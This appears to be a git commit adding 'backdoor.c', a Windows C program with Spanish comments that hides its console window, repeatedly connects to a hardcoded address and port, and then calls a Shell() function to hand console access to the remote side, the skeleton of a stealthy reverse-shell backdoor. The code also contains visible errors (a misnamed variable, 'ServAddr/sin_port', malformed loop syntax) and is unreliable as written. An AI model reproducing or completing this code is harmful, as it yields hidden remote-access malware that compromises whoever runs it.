795a3a5e3a7c93d669fa3b6084e5630b935e0905
danilodiez <danilodiez1@hotmail.com>
2020-07-13 11:28:58 -0300

    Funcion para conectar al servidor de origen

---
+++ backdoor.c
@@ -0,0 +1,66 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <winsock2.h>
+#include <windows.h>
+#include <winuser.h>
+#include <wininet.h>
+#include <windowsx.h>
+#include <string.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+
+int sock;
+
+int APIENTRY  WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lmCmdLine, int nCmdShow){
+
+	/* Con esta parte escondemos la consola al ejecutar el .exe */
+	HWND stealth;
+	AllocConsole();
+	stealth = FindWindowA("ConsoleWindowClass", NULL);
+	ShowWindow(stealth, 0);
+
+
+	struct sockaddr_in ServAddr;
+	unsigned short ServPort;
+	char *ServIP;
+	WSADATA wsaData; //Estructura con informacion del socket de Windows
+	ServIP = "192.168.1.117";
+	ServPort = 50005;
+
+
+
+
+	if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0){
+
+		exit(1);
+
+	}
+
+	sock = socket(AF_INET, SOCK_STREAM, 0);
+
+
+	memset(&ServerAddr, 0, sizeof(ServAddr)); //Limpia la variable con 0s, hay que indicar la posicion en memoria
+
+	ServAddr.sin_family = AF_INET;
+	ServAddr.sin_addr.s_addr = inet_addr(ServIP);
+	ServAddr/sin_port = htons(ServPort);
+
+
+
+	//Conectamos al servidor
+
+
+	while connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr) != 0 ) {
+
+		Sleep(10);
+
+
+	}
+
+	//Llamamos a la funcion que nos va a dar acceso a la consola
+	Shell();
+
+}
+
+
